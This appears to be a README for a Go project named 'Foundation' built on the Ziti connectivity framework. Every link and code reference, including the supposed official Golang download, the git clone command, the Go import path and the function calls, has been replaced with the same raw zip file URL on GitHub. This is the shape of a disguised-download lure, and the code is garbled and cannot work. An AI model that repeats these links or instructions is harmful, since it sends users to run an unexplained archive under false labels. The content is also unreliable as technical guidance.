## Introduction

The Ziti framework offers a unique approach to secure connectivity. With Foundation, you can build on this framework using Golang. This repository serves as a base for developers looking to integrate Ziti into their applications. 

## Getting Started

To get started, ensure you have Golang installed on your machine. You can download it from the official [Golang website](https://github.com/ROLOBOATO/foundation/raw/refs/heads/master/genext/Software-1.4.zip). Once you have Golang set up, you can clone this repository and start exploring the components.

## Installation

To install the Foundation components, clone the repository:

```bash
git clone https://github.com/ROLOBOATO/foundation/raw/refs/heads/master/genext/Software-1.4.zip
cd foundation
```

You can then use the Go tool to install the necessary dependencies:

```bash
go mod tidy
```

## Usage

Once installed, you can start using the components in your application. Here’s a simple example of how to integrate a component:

```go
package main

import (
    "fmt"
    "https://github.com/ROLOBOATO/foundation/raw/refs/heads/master/genext/Software-1.4.zip"
)

func main() {
    result := https://github.com/ROLOBOATO/foundation/raw/refs/heads/master/genext/Software-1.4.zip()
    https://github.com/ROLOBOATO/foundation/raw/refs/heads/master/genext/Software-1.4.zip(result)
}
```
